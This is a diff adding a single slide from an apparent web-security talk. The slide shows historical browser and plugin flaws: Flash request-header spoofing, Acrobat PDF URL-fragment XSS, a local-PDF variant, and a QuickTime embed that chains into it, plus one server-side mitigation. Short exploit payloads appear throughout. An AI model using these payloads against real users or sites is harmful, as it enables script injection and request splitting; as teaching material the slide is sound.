@@ -1,0 +1,34 @@
+<slide title="The Web keeps breaking">
+<break lines="1" />
+
+<blurb fontsize="4em">Remote spoofing arbitrary request headers</blurb>
+
+<example fontsize="2em" title="Courtesy of IE and Flash" result="0"><![CDATA[var req = new LoadVars();
+req.addRequestHeader("Host:", "host.example.com");
+req.send("http://host.foo.com/", "_blank");]]></example>
+
+<blurb fontsize="4em">
+A variation allows request splitting against servers with keep-alive enabled.
+</blurb>
+
+<blurb fontsize="4em">Macrodobe involved again</blurb>
+
+<example fontsize="2em" title="Acrobat" result="0"><![CDATA[
+http://example.org/foo.pdf#bar=javascript:alert('XSS');
+]]></example>
+
+<example fontsize="2em" title="Don't serve PDFs" result="0"><![CDATA[
+AddType application/octet-stream .pdf
+]]></example>
+
+<example fontsize="2em" title="Local too" result="0"><![CDATA[
+file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#a=javascript:...
+]]></example>
+
+<example fontsize="2em" title="Embed it in a media file to trick Firefox" result="0"><![CDATA[
+<?xml version="1.0">
+<?quicktime type="application/x-quicktime-media-link"?>
+<embed src="a.mp3" autoplay="true" qtnext="file:///C:/Program%20Files/Adobe/Acrobat%207.0/Resource/ENUtxt.pdf#a=javascript:your_code_here"/>
+]]></example>
+
+</slide>
